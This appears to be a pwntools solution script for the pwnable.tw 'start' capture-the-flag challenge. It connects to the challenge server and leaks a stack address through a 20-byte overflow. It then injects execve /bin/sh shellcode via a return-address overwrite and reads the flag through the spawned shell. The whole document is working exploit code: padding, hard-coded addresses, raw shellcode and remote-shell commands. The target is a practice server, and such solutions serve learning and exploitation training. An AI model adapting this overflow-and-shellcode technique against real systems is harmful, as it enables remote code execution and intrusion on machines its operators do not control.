from pwn import *

shellcode = "\x31\xc0\x99\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # execve /bin/sh shellcode

def create_stub(length):
	return "A" * length

def wait(string):
	server.recvuntil(string)

def connect():
	global server
	server = remote("chall.pwnable.tw", 10000) # connect to the server
	wait(":")

def leak():
	stub = create_stub(20)
	payload = stub + p32(0x08048087) # stack address is stored in ecx
	server.send(payload) # get the stack address
	msg = server.recv(20)[:4] # swallow total of 20 bytes to remove junk
	return u32(msg)

def pwn(addr):
	stub = create_stub(20)
	payload = stub + p32(addr + 20) + shellcode
	server.sendline(payload)

def read_flag():
	server.sendline("cat /home/start/flag")
	flag = server.recv(30)
	return flag

if __name__ == "__main__":
	connect()
	print "Sending first payload..."
	addr = leak()
	print "Stack address: %s" % hex(addr)
	print "Exploiting target..."
	pwn(addr)
	print "Reading flag..."
	flag = read_flag()
	print "Flag is: '%s'" % flag